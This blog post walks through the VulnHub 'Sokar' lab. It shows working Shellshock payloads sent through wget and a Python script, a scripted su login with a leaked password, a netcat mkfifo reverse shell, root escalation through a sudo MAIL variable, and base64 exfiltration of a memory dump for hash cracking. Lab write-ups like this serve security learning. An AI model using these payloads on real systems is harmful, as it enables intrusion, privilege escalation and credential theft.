---
layout: post
title: S(H)O(C)KAR - "Who's Apophis?" - shortcut run!
date: '2015-02-23T09:29:00.000+01:00'
author: marcing
tags:
- hacking challenge
- shellshock
- penetration testing
- sokar
- vulnhub
- pentest lab
- pentests
modified_time: '2015-02-23T10:51:15.827+01:00'
thumbnail: http://1.bp.blogspot.com/-6_PcbiMwM9o/VOrQSyKYvNI/AAAAAAAAAIs/8IjAQaY1BWk/s72-c/page.jpg
blogger_id: tag:blogger.com,1999:blog-252370192815002266.post-3692210958444450544
blogger_orig_url: https://blog.pentests.pl/2015/02/shockar-whos-apophis-shortcut-run.html
excerpt: After some absence, I’ve returned to hacking the (virtual) boxes. I’ve chosen random 2&nbsp;for a&nbsp;good start. Sokar was one of them.
---

After some absence, I’ve returned to hacking the (virtual) boxes. I’ve chosen random 2&nbsp;for a&nbsp;good start. Sokar was one of them. I’ve grabbed it from <a href="https://www.vulnhub.com/entry/sokar-1,113/" target="top">here</a>.

I must say, in the beginning I&nbsp;didn’t think that this challenge will be so cool (it really keeps your brain busy and check true skills not skills in finding some clue hidden inside some Latin text hidden inside jpg and so on). It took me 3&nbsp;days (not a&nbsp;whole 3&nbsp;days xD) to crack this one, and I’m glad I&nbsp;found it.

Ok let’s play!

## Day I

As always, first things first. Let’s find our target:

<div class="cssterm">
# netdiscover -i eth1 -r 192.168.56.0/24
  Currently scanning: Finished! |&nbsp;Screen View: Unique Hosts
  3 Captured ARP Req/Rep packets, from 3&nbsp;hosts. Total size: 180
  _____________________________________________________________________________
  IP At MAC Address Count Len MAC Vendor
  -----------------------------------------------------------------------------
  192.168.56.100 08:00:27:b0:82:0a 01 060 CADMUS COMPUTER SYSTEMS
  192.168.56.101 08:00:27:00:44:e4 01 060 CADMUS COMPUTER SYSTEMS
  192.168.56.103 08:00:27:f2:40:db 01 060 CADMUS COMPUTER SYSTEMS
</div>

Target’s IP is: 192.168.56.103. The other ones are IP of my host system and DHCP server. Next thing, port scan:

<div class="cssterm">
# nmap -sV -A -n 192.168.56.103 -p1-65535
  &nbsp;
  Starting Nmap 6.47 (&nbsp;http://nmap.org )&nbsp;at 2015-02-07 05:32 CET
  Stats: 0:00:08 elapsed; 0&nbsp;hosts completed (1 up), 1&nbsp;undergoing SYN Stealth Scan
  SYN Stealth Scan Timing: About 0.49% done
  Stats: 0:00:39 elapsed; 0&nbsp;hosts completed (1 up), 1&nbsp;undergoing SYN Stealth Scan
  SYN Stealth Scan Timing: About 2.77% done; ETC: 05:55 (0:22:14 remaining)
  Stats: 0:13:18 elapsed; 0&nbsp;hosts completed (1 up), 1&nbsp;undergoing SYN Stealth Scan
  SYN Stealth Scan Timing: About 66.11% done; ETC: 05:52 (0:06:49 remaining)
  Nmap scan report for 192.168.56.103
  Host is up (0.00039s latency).
  Not shown: 65534 filtered ports
  PORT&nbsp;&nbsp;&nbsp; STATE SERVICE VERSION
  591/tcp open&nbsp; http&nbsp;&nbsp;&nbsp; Apache httpd 2.2.15 ((CentOS))
  | http-methods: Potentially risky methods: TRACE
  |_See http://nmap.org/nsedoc/scripts/http-methods.html
  |_http-title: System Stats
  MAC Address: 08:00:27:F2:40:DB (Cadmus Computer Systems)
  Warning: OSScan results may be unreliable because we could not find at least 1&nbsp;open and 1&nbsp;closed port
  Device type: general purpose
  Running: Linux 2.6.X|3.X
  OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
  OS details: Linux 2.6.32 -&nbsp;3.10
  Network Distance: 1&nbsp;hop
  &nbsp;
  TRACEROUTE
  HOP RTT&nbsp;&nbsp;&nbsp;&nbsp; ADDRESS
  1&nbsp;&nbsp; 0.39 ms 192.168.56.103
  &nbsp;
  OS and Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
  Nmap done: 1&nbsp;IP address (1 host up) scanned in 858.28 seconds
</div>

So one open port: **591**, with Apache on the other side, rest reported as filtered. Damn… there’s high possibility there’s a&nbsp;firewall running there. I’ve opened my browser and here’s what I’ve got:

<div class="separator" style="clear: both; text-align: center;">
    <a href="/images/2015-02-23/page.jpg" imageanchor="1" style="margin-left: 1em; margin-right: 1em;">
      <img border="0" src="/images/2015-02-23/page.jpg" />
    </a>
</div>

Ok, going through source code shows me that there’s cgi-bin script running. I’ve started Dirbuster to check for any other things hosted but nothing interesting had been found. I’ve tried to look here and there, scanning udp, looking for vulns in Apache used on server…nothing. It was getting late so I&nbsp;decided to leave the challenge… end of day 1.

## Day II

I decided to look on this challenge differently… why look for something new… let’s stick with what I’ve already found. There’s a&nbsp;cgi script running, so probably that’s where I&nbsp;should look for a&nbsp;way in. I’ve asked google about: “cgi-bin vulnerabilities” and here’s what I&nbsp;saw:

<div class="separator" style="clear: both; text-align: center;">
  <a href="/images/2015-02-23/google.jpg" imageanchor="1" style="margin-left: 1em; margin-right: 1em;">
    <img border="0" src="/images/2015-02-23/google.jpg" height="636" width="640" />
  </a>
</div>

Shellshock! That’s something… heard about it, read about it, but never tried to use it. Here’s what they suggested as PoC:

<div class="cssterm">
# wget -U "() {&nbsp;test;};echo \"Content-type: text/plain\"; echo; echo; /bin/cat /etc/passwd" http://10.248.2.15/cgi-bin/test.cgi
</div>

I’ve changed IP and path to cgi and executed it. Voila:

<div class="cssterm">
# wget -U "() {&nbsp;test;};echo \"Content-type: text/plain\"; echo; echo; /bin/cat /etc/passwd" 192.168.56.103:591/cgi-bin/cat
  --2015-02-09 10:00:33--&nbsp; http://192.168.56.103:591/cgi-bin/cat
  Łączenie się z&nbsp;192.168.56.103:591... połączono.
  Żądanie HTTP wysłano, oczekiwanie na odpowiedź... 200 OK
  Długość: nieznana [text/plain]
  Zapis do: `cat'
  &nbsp;
  &nbsp;&nbsp;&nbsp; [&nbsp;&lt;=&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;]&nbsp;986&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; --.-K/s&nbsp;&nbsp; w&nbsp; 0s&nbsp;&nbsp;&nbsp;&nbsp;
  &nbsp;
  2015-02-09 10:00:33 (10,9 MB/s) -&nbsp;zapisano `cat' [986]
  &nbsp;
# cat cat
  &nbsp;
  root:x:0:0:root:/root:/bin/bash
  bin:x:1:1:bin:/bin:/sbin/nologin
  daemon:x:2:2:daemon:/sbin:/sbin/nologin
  adm:x:3:4:adm:/var/adm:/sbin/nologin
  lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
  sync:x:5:0:sync:/sbin:/bin/sync
  shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
  halt:x:7:0:halt:/sbin:/sbin/halt
  mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
  uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin
  operator:x:11:0:operator:/root:/sbin/nologin
  games:x:12:100:games:/usr/games:/sbin/nologin
  gopher:x:13:30:gopher:/var/gopher:/sbin/nologin
  ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
  nobody:x:99:99:Nobody:/:/sbin/nologin
  vcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologin
  saslauth:x:499:76:"Saslauthd user":/var/empty/saslauth:/sbin/nologin
  postfix:x:89:89::/var/spool/postfix:/sbin/nologin
  sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
  bynarr:x:500:501::/home/bynarr:/bin/bash
  apache:x:48:48:Apache:/var/www:/sbin/nologin
  apophis:x:501:502::/home/apophis:/bin/bash
</div>

So now I&nbsp;was inside :) I&nbsp;started looking here and there, what’s inside different folders, what possibilities gives me my current access level. Using wget all the time was not an option so I’ve grabbed and changed Python script to help me out:

```py
# CVE-2014-6271 cgi-bin reverse shell
# Original: http://pastebin.com/raw.php?i=166f8Rjx

import httplib,urllib,sys
if (len(sys.argv)<3):
  print "Usage: %s <host> <vulnerable CGI>" % sys.argv[0]
  print "Example: %s localhost /cgi-bin/test.cgi" % sys.argv[0]
  exit(0)

conn = httplib.HTTPConnection(sys.argv[1])
reverse_shell="() { test;};echo \"Content-type: text/plain\"; echo; echo; " + sys.argv[3]

headers = {"Content-type": "application/x-www-form-urlencoded","test":reverse_shell }
conn.request("GET",sys.argv[2],headers=headers)
res = conn.getresponse()
print res.status, res.reason
data = res.read()
print data
```

I’ve tried to create some reverse shell but unfortunately firewall blocked all my attempts. I&nbsp;found interesting script in one of user’s home for creating memory dump of the machine. I’ll try using that later. Time passed and I&nbsp;still didn’t have anything interesting…so I&nbsp;moved to “/var/mail” as that’s a&nbsp;place where sometimes you can find some useful info. And I&nbsp;found something, a&nbsp;mail to one of the users:

<div class="cssterm">
# python python_shocker.py 192.168.56.103:591 /cgi-bin/cat "/bin/ls -la /var/mail/"
  200 OK
  &nbsp;
  total 12
  drwxrwxr-x. 2&nbsp;root&nbsp;&nbsp;&nbsp; mail 4096 Dec 30 21:09 .
  drwxr-xr-x. 8&nbsp;root&nbsp;&nbsp;&nbsp; root 4096 Nov 12 13:29 ..
  -rw-rw----&nbsp; 1&nbsp;apophis mail&nbsp;&nbsp;&nbsp; 0&nbsp;Dec 30 19:20 apophis
  -rw-rw-r--. 1&nbsp;bynarr&nbsp; mail&nbsp; 551 Dec 30 21:09 bynarr
  &nbsp;
# python python_shocker.py 192.168.56.103:591 /cgi-bin/cat "/bin/cat /var/mail/bynarr"
  200 OK
  &nbsp;
  Return-Path: &lt;root@sokar&gt;
  Delivered-To: bynarr@localhost
  Received:&nbsp; from root by localhost
  To: &lt;bynarr@sokar&gt;
  Date: Thu, 13 Nov 2014 22:04:31 +0100
  Subject: Welcome
  &nbsp;
  Dear Bynarr.&nbsp; Welcome to Sokar Inc. Forensic Development Team.
  A user account has been setup for you.
  &nbsp;
  UID 500 (bynarr)
  GID 500 (bynarr)
  &nbsp;&nbsp;&nbsp; 501 (forensic)
  &nbsp;
  Password 'fruity'.&nbsp; Please change this ASAP.
  Should you require, you've been granted outbound ephemeral port access on 51242, to transfer non-sensitive forensic dumps out for analysis.
  &nbsp;
  All the best in your new role!
  &nbsp;
  &nbsp; -Sokar-
</div>

User pass (probably not changed) and info about an open port, I&nbsp;couldn’t ask for more :) I’ve tried pushing shell through that port but without success. I’ve checked google…there’s a&nbsp;way to create user specific rules in iptables…good to know!

Now I&nbsp;need a&nbsp;way to login as bynarr… My current access didn’t give me a&nbsp;possibility to su to another user. I&nbsp;started searching for some clues… oh I’ve searched a&nbsp;lot. Here’s my discovery (I'm sorry but I&nbsp;can't remember where I&nbsp;found that):

<div class="cssterm">
# (sleep 1; echo test2.,) |&nbsp;python -c "import pty; pty.spawn(['/bin/su','test2','-c','whoami']);"
</div>

This sends user password to su spawned by python. Quick test on my local machine and it works great!&nbsp; But how can I&nbsp;run it inside target system? There are quotation marks and quotes… I couldn’t&nbsp; use it in my script… I had to find anotherway… but that’s a&nbsp;task for the next day…

## Day III

I woke up in the morning with an idea in my head… let’s create script inside target looking like:

<div class="cssterm">
# cat cmdx
  #/bin/bash
  (sleep 1; echo fruity) |&nbsp;python -c "import pty; pty.spawn(['/bin/su','bynarr','-c','$1']);"
</div>

I can execute something like that with my python script, but how will I&nbsp;create that script inside target with my current access? After a&nbsp;while I’ve decided to try using base64.

<div class="cssterm">
# base64 cmdx
  IyEvYmluL2Jhc2gKKHNsZWVwIDE7IGVjaG8gZnJ1aXR5KSB8IHB5dGhvbiAtYyAiaW1wb3J0IHB0
  eTsgcHR5LnNwYXduKFsnL2Jpbi9zdScsJ2J5bmFycicsJy1jJywnJDEnXSk7Igo=
</div>

My first try was looking like that:

<div class="cssterm">
# python python_shocker.py 192.168.56.103:591 /cgi-bin/cat "/bin/echo IyEvYmluL2Jhc2gKKHNsZWVwIDE7IGVjaG8gZnJ1aXR5KSB8IHB5dGhvbiAtYyAiaW1wb3J0IHB0eTsgcHR5LnNwYXduKFsnL2Jpbi9zdScsJ2J5bmFycicsJy1jJywnJDEnXSk7Igo= |&nbsp;base64 -d &gt; /tmp/su_logger"
  200 OK
  &nbsp;
# python python_shocker.py 192.168.56.103:591 /cgi-bin/cat "/bin/ls -la /tmp/"200 OK
  &nbsp;
  total 16
  drwxrwxrwt.&nbsp; 3&nbsp;root&nbsp;&nbsp; root&nbsp;&nbsp; 4096 Feb&nbsp; 9&nbsp;09:45 .
  dr-xr-xr-x. 22 root&nbsp;&nbsp; root&nbsp;&nbsp; 4096 Feb&nbsp; 9&nbsp;08:34 ..
  drwxrwxrwt&nbsp;&nbsp; 2&nbsp;root&nbsp;&nbsp; root&nbsp;&nbsp; 4096 Feb&nbsp; 9&nbsp;08:34 .ICE-unix
  -rw-rw-r--&nbsp;&nbsp; 1&nbsp;bynarr bynarr 1349 Feb&nbsp; 9&nbsp;09:45 stats
  -rw-r--r--&nbsp;&nbsp; 1&nbsp;apache apache&nbsp;&nbsp;&nbsp; 0&nbsp;Feb&nbsp; 9&nbsp;09:45 su_logger
</div>

This doesn’t look good… for some reason this didn’t work as I&nbsp;hoped it would. My bad… I forgot that I&nbsp;need bash for pipe and stuff, let’s update my command:

<div class="cssterm">
# python python_shocker.py 192.168.56.103:591 /cgi-bin/cat "/bin/bash -c '/bin/echo IyEvYmluL2Jhc2gKKHNsZWVwIDE7IGVjaG8gZnJ1aXR5KSB8IHB5dGhvbiAtYyAiaW1wb3J0IHB0eTsgcHR5LnNwYXduKFsnL2Jpbi9zdScsJ2J5bmFycicsJy1jJywnJDEnXSk7Igo= |&nbsp;base64 -d &gt;
  /tmp/su_logger'"
  200 OK
  &nbsp;
  &nbsp;
# python python_shocker.py 192.168.56.103:591 /cgi-bin/cat "/bin/ls -la /tmp/"
  200 OK
  &nbsp;
  total 20
  drwxrwxrwt.&nbsp; 3&nbsp;root&nbsp;&nbsp; root&nbsp;&nbsp; 4096 Feb&nbsp; 9&nbsp;09:45 .
  dr-xr-xr-x. 22 root&nbsp;&nbsp; root&nbsp;&nbsp; 4096 Feb&nbsp; 9&nbsp;08:34 ..
  drwxrwxrwt&nbsp;&nbsp; 2&nbsp;root&nbsp;&nbsp; root&nbsp;&nbsp; 4096 Feb&nbsp; 9&nbsp;08:34 .ICE-unix
  -rw-rw-r--&nbsp;&nbsp; 1&nbsp;bynarr bynarr 1527 Feb&nbsp; 9&nbsp;09:46 stats
  -rw-r--r--&nbsp;&nbsp; 1&nbsp;apache apache&nbsp; 104 Feb&nbsp; 9&nbsp;09:46 su_logger
  &nbsp;
# python python_shocker.py 192.168.56.103:591 /cgi-bin/cat "/bin/cat /tmp/su_logger"
  200 OK
  &nbsp;
  #!/bin/bash
  (sleep 1; echo fruity) |&nbsp;python -c "import pty; pty.spawn(['/bin/su','bynarr','-c','$1']);"
</div>

I’ve made it executable:

<div class="cssterm">
# python python_shocker.py 192.168.56.103:591 /cgi-bin/cat "/bin/chmod +x /tmp/su_logger"
</div>

and tried it out:

<div class="cssterm">
# python python_shocker.py 192.168.56.103:591 /cgi-bin/cat "/bin/bash -c '/tmp/su_logger \"whoami\"'"
  200 OK
  &nbsp;
  &nbsp;
  Password:
  bynarr
</div>

Bullseye! You can call me bynarr starting from now. It’s good that there is always
someone who doesn’t change their password. You can believe it or not but with access
through that script I’ve managed to get memory dump using lime script inside /home/bynarr
and download it. If you are interested, how I’ve done that, you will find all details at the end of this post.

Inside mail to bynarr was also info about an open port. Let’s try it…on my local machine I&nbsp;started netcat:
<div class="cssterm">
# nc -vv -l -p 51242
  listening on [any] 51242 ...
</div>

and invoked my python script:

<div class="cssterm">
# python python_shocker.py 192.168.56.103:591 /cgi-bin/cat "/bin/bash -c '/tmp/su_logger \"/bin/rm /tmp/f; /usr/bin/mkfifo /tmp/f; /bin/cat /tmp/f |&nbsp;/bin/sh -i 2&gt;&amp;1 |&nbsp;nc 192.168.56.102 51242 &gt; /tmp/f &amp;\" 2&gt;&amp;1'"
  200 OK
</div>

Let’s go back to netcat:

<div class="cssterm">
# nc -vv -l -p 51242
  listening on [any] 51242 ...
  192.168.56.103: inverse host lookup failed: Unknown server error :&nbsp;Connection timed out
  connect to [192.168.56.102] from (UNKNOWN) [192.168.56.103] 50696
  sh: no job control in this shell
  sh-4.1$ whoami
  whoami
  bynarr
  sh-4.1$ python -c 'import pty;pty.spawn("/bin/bash");'
  python -c 'import pty;pty.spawn("/bin/bash");'
  [bynarr@sokar cgi-bin]$
</div>

Immediately I&nbsp;spawned shell with python (I will need it). I&nbsp;had memory
dump already so I&nbsp;didn’t need to create another one, cudaHashcat (for hashes
found inside dump) was still downloading, so I’ve decided to look around and see what
else I&nbsp;can do with my new, fresh shell. I&nbsp;googled around for
“shellshock and sudo”. There was question about shellshock and sudo on Stack Overflow.
They tried to do something like that:

<div class="cssterm">
# [bynarr@sokar cgi-bin]$ sudo -l
  sudo -l
  Matching Defaults entries for bynarr on this host:
  &nbsp;&nbsp;&nbsp; !requiretty, visiblepw, always_set_home, env_reset, env_keep="COLORS
  &nbsp;&nbsp;&nbsp; DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR LS_COLORS", env_keep+="MAIL PS1
  &nbsp;&nbsp;&nbsp; PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE
  &nbsp;&nbsp;&nbsp; LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY
  &nbsp;&nbsp;&nbsp; LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL
  &nbsp;&nbsp;&nbsp; LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
  &nbsp;&nbsp;&nbsp; secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

  User bynarr may run the following commands on this host:
  &nbsp;&nbsp;&nbsp; (ALL) NOPASSWD: /home/bynarr/lime

  Result:
  [bynarr@sokar cgi-bin]$ export MAIL="() {&nbsp;:;} ;&nbsp;echo busted"
  export MAIL="() {&nbsp;:;} ;&nbsp;echo busted"
  [bynarr@sokar cgi-bin]$ sudo /home/bynarr/lime
  sudo /home/bynarr/lime

  ==========================
  Linux Memory Extractorator
  ==========================

  LKM, add or remove?
  &gt; q
  q
  Invalid input, burn in the fires of Netu!
</div>

No busted visible…damn it. As my Internet was damn slow and I&nbsp;still didn’t
have newest cudaHashcat, I’ve decided to read sudo manual. Here’s what interested me:

<div class="cssterm">
sudo [-AbEHnPS] [-C fd] [-g group name|#gid] [-p prompt] [-r role] [-t type] [-u user name|#uid] [VAR=value] [-i |&nbsp;-s] [command]
</div>

Hmmm…**[VAR=value]** looks promising. Let’s try it:

<div class="cssterm">
# [bynarr@sokar cgi-bin]$ sudo MAIL="() {&nbsp;:;} ;&nbsp;echo busted" /home/bynarr/lime
  sudo MAIL="() {&nbsp;:;} ;&nbsp;echo busted" /home/bynarr/lime
  busted <b><span style="color: red;">&lt;- check this out!!!</span></b>

  ==========================
  Linux Memory Extractorator
  ==========================

  LKM, add or remove?
  &gt; q
  q
  Invalid input, burn in the fires of Netu!
  [bynarr@sokar cgi-bin]$
</div>

I must say…I was happy like a&nbsp;small boy who just got his birthday present. Let’s finish this out!

<div class="cssterm">
# [bynarr@sokar cgi-bin]$ sudo MAIL="() {&nbsp;:;} ;&nbsp;/bin/bash" /home/bynarr/lime
  sudo MAIL="() {&nbsp;:;} ;&nbsp;/bin/bash" /home/bynarr/lime
  [root@sokar cgi-bin]# whoami
  whoami
  root
  [root@sokar cgi-bin]# ls -la /root
  ls -la /root
  total 36
  dr-xr-x---.&nbsp; 2&nbsp;root root 4096 Jan 15 21:14 .
  dr-xr-xr-x. 22 root root 4096 Feb&nbsp; 9&nbsp;08:34 ..
  -rw-------.&nbsp; 1&nbsp;root root&nbsp;&nbsp;&nbsp; 0&nbsp;Jan 27 19:30 .bash_history
  -rw-r--r--.&nbsp; 1&nbsp;root root&nbsp;&nbsp; 18 May 20&nbsp; 2009 .bash_logout
  -rw-r--r--.&nbsp; 1&nbsp;root root&nbsp; 176 May 20&nbsp; 2009 .bash_profile
  -rw-r--r--.&nbsp; 1&nbsp;root root&nbsp; 176 Sep 23&nbsp; 2004 .bashrc
  -rw-r--r--&nbsp;&nbsp; 1&nbsp;root root&nbsp; 678 Jan&nbsp; 2&nbsp;17:21 build.c
  -rw-r--r--.&nbsp; 1&nbsp;root root&nbsp; 100 Sep 23&nbsp; 2004 .cshrc
  -rw-r--r--&nbsp;&nbsp; 1&nbsp;root root&nbsp; 837 Jan 15 21:14 flag
  -rw-r--r--.&nbsp; 1&nbsp;root root&nbsp; 129 Dec&nbsp; 3&nbsp; 2004 .tcshrc
</div>

Before typing the last command I’ve just stopped for a&nbsp;minute, just to enjoy the view.

<div class="cssterm">
[root@sokar cgi-bin]# cat /root/flag
  cat /root/flag
  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0&nbsp;&nbsp; 0
  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |&nbsp;&nbsp; |
  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ____|___|____
  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0&nbsp; |~ ~&nbsp;~ ~&nbsp;~ ~|&nbsp;&nbsp; 0
  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |&nbsp; |&nbsp;&nbsp; Happy&nbsp;&nbsp; |&nbsp;&nbsp; |
  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ___|__|___________|___|__
  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |/\/\/\/\/\/\/\/\/\/\/\/|
  &nbsp; 0&nbsp;&nbsp; |&nbsp;&nbsp;&nbsp; B&nbsp;i r&nbsp;t h&nbsp;d a&nbsp;y&nbsp;&nbsp;&nbsp; |&nbsp;&nbsp; 0
  &nbsp; |&nbsp;&nbsp; |/\/\/\/\/\/\/\/\/\/\/\/|&nbsp;&nbsp; |
  &nbsp;_|___|_______________________|___|__
  |/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/|
  |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |
  |&nbsp;&nbsp;&nbsp;&nbsp; V&nbsp; u&nbsp; l&nbsp; n&nbsp; H&nbsp; u&nbsp; b&nbsp;&nbsp; !&nbsp;!&nbsp;&nbsp;&nbsp;&nbsp; |
  | ~&nbsp;~ ~&nbsp;~ ~&nbsp;~ ~&nbsp;~ ~&nbsp;~ ~&nbsp;~ ~&nbsp;~ ~&nbsp;~ ~&nbsp;|
  |___________________________________|

  =====================================
  | Congratulations on beating Sokar! |
  |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |
  |&nbsp; Massive shoutout to g0tmi1k and&nbsp; |
  | the entire community which makes&nbsp; |
  |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; VulnHub possible!&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |
  |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |
  |&nbsp;&nbsp;&nbsp; rasta_mouse (@_RastaMouse)&nbsp;&nbsp;&nbsp;&nbsp; |
  =====================================
</div>

Done! Challenge complete ^^ That’s all folks…


Ok not all…I promised I’ll show how I&nbsp;took the memory dump.&nbsp; I&nbsp;didn’t have interactive shell access and I&nbsp;needed to pass “add” to script in order to create dump. You can cat file with “add” inside to script and it’ll work: </div>

<div class="cssterm">
# python python_shocker.py 192.168.56.103:591 /cgi-bin/cat "/bin/bash -c '/tmp/su_logger \"echo add &gt; /tmp/add\"'"
  200 OK

  Password:

  # python python_shocker.py 192.168.56.103:591 /cgi-bin/cat "/bin/bash -c '/tmp/su_logger \"cat /tmp/add\"'"200 OK

  Password:
  add

  # python python_shocker.py 192.168.56.103:591 /cgi-bin/cat "/bin/bash -c '/tmp/su_logger \"sudo /home/bynarr/lime &lt; /tmp/add\"'"
  200 OK

  Password:

  ==========================
  Linux Memory Extractorator
  ==========================

  LKM, add or remove?
  &gt;
  # python python_shocker.py 192.168.56.103:591 /cgi-bin/cat "/bin/bash -c '/tmp/su_logger \"ls -la /tmp\"'"200 OK

  Password:
  total 261720
  drwxrwxrwt.&nbsp; 3&nbsp;root&nbsp;&nbsp; root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 4096 Feb&nbsp; 9&nbsp;10:25 .
  dr-xr-xr-x. 22 root&nbsp;&nbsp; root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 4096 Feb&nbsp; 9&nbsp;08:34 ..
  drwxrwxrwt&nbsp;&nbsp; 2&nbsp;root&nbsp;&nbsp; root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 4096 Feb&nbsp; 9&nbsp;08:34 .ICE-unix
  -rw-r--r--&nbsp;&nbsp; 1&nbsp;bynarr bynarr&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 4&nbsp;Feb&nbsp; 9&nbsp;10:24 add
  prw-r--r--&nbsp;&nbsp; 1&nbsp;bynarr bynarr&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0&nbsp;Feb&nbsp; 9&nbsp;10:22 f
  -r--r--r--&nbsp;&nbsp; 1&nbsp;root&nbsp;&nbsp; root&nbsp;&nbsp; 267971584 Feb&nbsp; 9&nbsp;10:25 ram
  -rw-rw-r--&nbsp;&nbsp; 1&nbsp;bynarr bynarr&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 1705 Feb&nbsp; 9&nbsp;10:25 stats
  -rwxr-xr-x&nbsp;&nbsp; 1&nbsp;apache apache&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 104 Feb&nbsp; 9&nbsp;09:46 su_logger
</div>

As you can see there’s a&nbsp;new file named ram containing memory dump. Now… how to g
et it out without open ports (I&nbsp;forgot about 51242 :) ?&nbsp;Base64 was helpful as always:

<div class="cssterm">
# python python_shocker.py 192.168.56.103:591 /cgi-bin/cat "/bin/bash -c '/tmp/su_logger \"base64 /tmp/ram\"'" &gt; tmp_ram
# ls -la tmp_ram
  -rw-r--r-- 1&nbsp;root root 366697981 lut&nbsp; 9&nbsp;11:30 tmp_ram
</div>

It’s still base64 and there’s another problem, during transport newline chars have
been broken and typing **base64&nbsp;-d&nbsp;tmp_ram** will give you an error.
Good there’s **dos2unix**. After fixing, file will be decoded properly and you
will have a&nbsp;piece of memory to look inside. I&nbsp;executed strings on it and
found hashes (from **/etc/shadow**) for **root**, **apophis** and **bynarr**
(that’s why I&nbsp;needed **cudaHashcat**). I&nbsp;also looked for firewall
rules inside that dump (I&nbsp;still didn’t remember about that open port from mail)
and that’s where I&nbsp;found open port for my reverse shell :)

**THE END!**
